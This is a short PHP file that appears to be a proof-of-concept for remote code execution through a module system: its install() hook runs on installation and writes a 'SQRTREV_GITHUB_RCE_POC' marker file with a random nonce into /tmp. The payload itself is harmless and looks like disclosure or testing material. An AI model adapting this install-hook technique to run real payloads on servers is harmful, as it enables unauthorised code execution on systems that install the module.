<?php

namespace Modules\Malicious\Poc;

use App\Extension\AbstractModule;

class Module extends AbstractModule
{
    public function install(): bool
    {
        parent::install();

        $nonce = bin2hex(random_bytes(8));
        $marker_file = "/tmp/sqrtrev_github_rce_".substr($nonce, 0, 8).".txt";
        $marker_content = "SQRTREV_GITHUB_RCE_POC: ".$nonce."\n";
        file_put_contents($marker_file, $marker_content);

        return true;
    }

    public function uninstall(): bool
    {
        return parent::uninstall();
    }
}
